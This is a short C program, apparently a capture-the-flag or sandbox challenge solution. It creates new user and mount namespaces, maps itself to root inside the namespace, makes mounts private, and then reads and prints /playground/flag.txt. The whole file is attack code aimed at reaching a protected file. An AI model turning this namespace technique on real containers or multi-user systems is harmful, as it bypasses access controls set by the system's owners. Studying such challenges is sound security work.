#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mount.h>

int main(int argc, char **argv, char **envp) {
  int fd;

  if (unshare(CLONE_NEWNS | CLONE_NEWUSER)) {
    perror("unshare");
    return 1;
  }

  if ((fd = open("/proc/self/setgroups", O_WRONLY)) == -1) {
    perror("/proc/self/setgroups");
    return 1;
  }
  write(fd, "deny", 4);
  close(fd);

  if ((fd = open("/proc/self/uid_map", O_WRONLY)) == -1) {
    perror("/proc/self/uid_map");
    return 1;
  }
  write(fd, "0 1337 1", 8);
  close(fd);

  if ((fd = open("/proc/self/gid_map", O_WRONLY)) == -1) {
    perror("/proc/self/gid_map");
    return 1;
  }
  write(fd, "0 1337 1", 8);
  close(fd);

  if (mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL)) {
    perror("mount");
    return 1;
  }

  char buf[0x100];
  if ((fd = open("/playground/flag.txt", O_RDONLY)) == -1) {
    perror("open");
    return 1;
  }
  read(fd, buf, 0x100);
  puts(buf);
  close(fd);

  return 0;
}
